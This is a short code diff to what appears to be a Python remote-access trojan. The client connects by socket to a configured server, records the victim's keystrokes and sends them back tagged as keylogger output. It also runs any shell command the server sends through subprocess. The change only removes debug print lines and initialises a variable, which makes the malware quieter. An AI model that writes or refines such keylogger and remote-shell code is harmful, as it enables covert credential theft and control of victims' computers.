@@ -12,6 +12,7 @@ FORMAT = 'utf-8'
 ADDR = (SERVER, PORT)
 kloutput = []
 line = ""
+output = ""
 
 client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 client.connect(ADDR)
@@ -36,7 +37,6 @@ def log_keystroke(key):
             line = ""
         if key:
             kloutput.append(key)
-        print(kloutput)
         output = "<kl>" + str(kloutput)
 
 
@@ -97,7 +97,6 @@ while True:
         if "close" in command.split():
             client.close()
         if command.split()[0] not in ["kl", "mb"]:
-            print("not kl or mb")
             output = subprocess.getoutput(command)
         cwd = os.getcwd()
         output = str(output)
